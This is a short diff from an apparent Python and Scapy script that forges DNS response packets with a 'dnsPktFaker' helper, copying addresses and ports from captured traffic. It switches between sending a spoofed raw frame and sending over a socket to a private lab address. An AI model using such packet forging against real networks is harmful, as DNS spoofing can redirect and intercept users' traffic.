@@ -242,8 +242,8 @@ if __name__ == '__main__':
             fakeDnsPkt = dnsPktFaker(etherDst=pkt['Ether'].dst, etherSrc=pkt['Ether'].dst,
                                     ipDst=pkt['IP'].dst, ipSrc=pkt['IP'].src, dstPort=pkt['UDP'].dport, srcport=pkt['UDP'].sport,
                                     dnsPkt=buildNoRecurPkt)
-            # su.sendto(str(buildNoRecurPkt),('192.168.1.222', pkt['UDP'].sport))
-            sendp(Ether()/IP(src=pkt['IP'].dst, dst=pkt['IP'].src)/UDP(sport=pkt['UDP'].dport, dport=pkt['UDP'].sport)/buildNoRecurPkt)
+            su.sendto(str(buildNoRecurPkt),('172.31.81.222', pkt['UDP'].sport))
+            # sendp(Ether()/IP(src=pkt['IP'].dst, dst=pkt['IP'].src)/UDP(sport=pkt['UDP'].dport, dport=pkt['UDP'].sport)/buildNoRecurPkt)
             print('send*******************')
             print(hexdump(buildNoRecurPkt), buildNoRecurPkt.summary())
 
